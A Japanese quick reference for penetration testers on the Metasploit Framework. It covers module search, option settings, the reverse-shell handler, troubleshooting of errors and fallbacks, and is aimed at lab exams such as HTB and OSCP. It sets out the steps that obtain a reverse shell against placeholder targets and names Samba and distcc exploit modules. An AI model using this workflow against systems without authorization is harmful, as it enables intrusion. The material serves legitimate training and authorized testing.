# Metasploit Framework クイックリファレンス

> **スコープ**: msfconsole でのモジュール探索フロー・パラメータ設定・handler の仕組みとエラー読み分けを扱う。各 CVE の具体的な実行コマンドは対応する技術ファイルを参照。

## 着火条件

- `searchsploit` / NVD でヒットした CVE に Metasploit モジュールが存在する
- 演習環境（HTB / OSCP 等）で msf 枠を使ってよいと判断した場合（試験によっては Metasploit 利用に制限がある — 他ターゲット向けに手動経路も必ず持つ）

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `msfconsole`（ペネトレ用 Linux ディストリ標準搭載）
- 外部リソース依存: なし（ローカル DB は `/usr/share/metasploit-framework/modules/`）

## 先に確認すること

- **LHOST は必ず明示する**（未設定時に NAT / docker bridge を誤選択して no session になる — 後述）
- **msf モジュールを使う場合は nc を同じ LPORT で立てない**（handler との競合 — 後述）

---

## 1. モジュール探索フロー

**攻撃者の思考トレース:** `searchsploit` で候補を絞ってから msf 内を検索する。`search` は名前・説明・CVE 番号を横断するので製品名＋版数、または CVE 番号で絞り込む。

**コマンド:**

```bash
# [Attacker] msfconsole 起動
msfconsole

# [Attacker] モジュール検索（製品名 + バージョン、または CVE 番号）
msf > search <製品名> <バージョン>
msf > search cve:<YEAR>-<ID>
# 例: search samba 3.0  /  search cve:2007-2447  /  search distcc
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `# Name ... Rank Description` の一覧 | 候補一覧 | `use <番号>` または `use <フルパス>` |
| 0 件 | msf にモジュールが無い | GitHub / Exploit-DB で手動 PoC を探す（`../05_Tools_Reference/Searchsploit.md` 参照） |

**注意:** 同一 CVE に複数モジュールがある場合は Rank（excellent > great > good > normal）が高いものを優先する。

---

## 2. モジュール選択・設定・実行

**コマンド:**

```bash
msf > use <N>                         # 番号またはフルパスで選択
msf > info                            # 説明・前提条件・影響範囲を確認（必ず読む）
msf > show options                    # Required: yes の項目を確認
msf > show payloads                   # 利用可能なペイロード（省略時はデフォルト）

msf > set RHOSTS [TARGET_IP]          # ターゲット IP
msf > set LHOST [ATTACKER_IP]         # ← 必ず明示（後述）
msf > set LPORT [PORT]                # リスナーポート（省略時 4444）
msf > run
```

### LHOST を必ず明示する理由

msf は LHOST 未設定時にシステムのデフォルトルートのインターフェースを自動選択する。**VPN・NAT・docker bridge が混在する環境では、ターゲットから到達できないインターフェースを選ぶことがある。**

```bash
# [Attacker] 到達可能インターフェースを確認してから set する
ip a                                  # 全インターフェース表示
# ターゲットまでのルーティング経路（VPN / 物理 LAN 等）に対応する IP を選ぶ
# → どのインターフェースを選ぶかの判断: ../06_Concepts/Reverse_Shell.md「攻撃側の準備①」

msf > set LHOST [ATTACKER_IP]         # IP 直書き
msf > set LHOST [IF_NAME]             # または IF 名で渡す（IP が変わっても自動更新。名前は ip a で確認）
```

---

## 3. handler の仕組みと nc との住み分け

リバースシェルを取るモジュールは **msf が内部でリスナー（handler）を自動起動する**。

```
[msf run]
  → [msf が LHOST:LPORT で listen 開始]
  → [ペイロードをターゲットに送信]
  → [ターゲットが LHOST:LPORT に接続]
  → [msf の handler がセッションを受け取る]
```

> **同じ LPORT で nc を先に起動すると msf が bind できず即中断する。**  
> msf モジュールを使う場合は nc を立てない。nc が必要なのは手動 PoC 経路の場合のみ。

| 経路 | リスナー起動 |
|---|---|
| 手動 PoC / スクリプト / コマンドインジェクション | `nc -lvnp [PORT]` を自分で先に起動 |
| msf モジュール（reverse 系 payload） | **nc を立てない** — msf が `run` 時に自動起動 |

---

## 4. エラー読み分け表

**コマンド:**

```bash
# run 後のコンソール出力でエラーを読み分ける
```

**観測される出力 → 次のアクション:**

| 出力 | 原因 | 対処 |
|---|---|---|
| `Handler failed to bind ... address already in use` | 同じ LPORT を nc または他プロセスが既に占有 | `ss -tlnp \| grep [PORT]` で確認 → 占有プロセスを止めるか `set LPORT [別ポート]` |
| `Started reverse TCP handler on [NAT/bridge IP]` → `Exploit completed, but no session` | LHOST 未設定 or 誤 IF 選択。ターゲットから到達できない IF が選ばれた | `set LHOST [到達可能 IP または IF 名]` で再実行（`ip a` で確認） |
| `Exploit failed [unreachable]: Rex::HostUnreachable` | RHOSTS の IP に到達できない（IP タイポ・ルート不備） | RHOSTS を確認 → `ping [TARGET_IP]` / `nmap -p [PORT] [TARGET_IP]` で疎通確認 |
| `Exploit completed, but no session`（handler が正しい IP で起動している） | ペイロードは送れたが戻りが FW でブロック | LPORT を 443 / 80 に変更 / `show payloads` で bind shell に切替 |
| `No payload configured, defaulting to cmd/unix/reverse_bash`（既定ペイロードはモジュールにより異なる） | ペイロード未設定の情報メッセージ（エラーではない） | そのまま run でよい。変更したい場合は `set payload <path>` |

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| msf モジュール自体が存在しない | Exploit-DB 未掲載 / 古い msf DB | `sudo msfdb update` でモジュール更新 → GitHub で手動 PoC を探す（`Searchsploit.md` 参照） |
| モジュールはあるが不発 | 前提条件の未充足（設定オプション・OS・版数） | `info` の Description / References を読んで前提を確認 → 手動 PoC に切替 |
| セッションを取れた直後にターゲットが再起動 | 古いサービスへの exploit が不安定 | 演習環境では session 取得直後に `background` して結果を保存 |

## 注意点・落とし穴

> **[HIGH IMPACT]** msf のシェル取得系 exploit は本番では原則禁止または個別合意必須：
> - [x] 意図しないサービスクラッシュ・業務停止リスク
> - [ ] 持続化（セッション自体は一時的だが痕跡は残る）
> - [x] SIEM / IDS で検知される（msf デフォルト payload のシグネチャは IDS に登録済み）
>
> 演習環境（HTB / OSCP 等）では制約なし。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — シェル取得系 exploit 全般）
- **想定される SIEM / IDS 検知**: デフォルト payload の通信パターン・シグネチャ
- **業務影響リスク**: 古いサービスへの exploit 試行によるクラッシュ
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

## 関連技術

- 前：版数 → CVE 照合 → msf モジュール特定 → `Searchsploit.md`
- 後：msf セッション安定化 → `../03_Post_Access_Linux/Shell_Stabilization.md`
- 関連：リバースシェルの原理・LHOST インターフェース選択 → `../06_Concepts/Reverse_Shell.md`
- 関連：usermap_script モジュールの例 → `../02_Initial_Access/Samba_Exploitation.md`
- 関連：distcc_exec モジュールの例 → `../02_Initial_Access/distcc_Exploitation.md`
